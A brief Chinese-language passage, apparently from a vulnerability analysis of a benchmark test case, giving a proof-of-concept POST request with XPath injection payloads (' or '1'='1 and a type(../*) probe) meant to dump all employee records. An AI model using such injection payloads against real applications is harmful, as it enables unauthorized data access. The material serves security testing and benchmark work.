如果修复语法错误后（将第62行 f-string 改为双引号包裹），PoC 为：
```
POST /benchmark/xpathi-00/BenchmarkTest00107
Content-Type: application/x-www-form-urlencoded

BenchmarkTest00107=' or '1'='1
```
预期返回所有员工信息（布尔盲注/注入）。或探测其他节点：
```
BenchmarkTest00107=foo' and type(../*)='foobar
```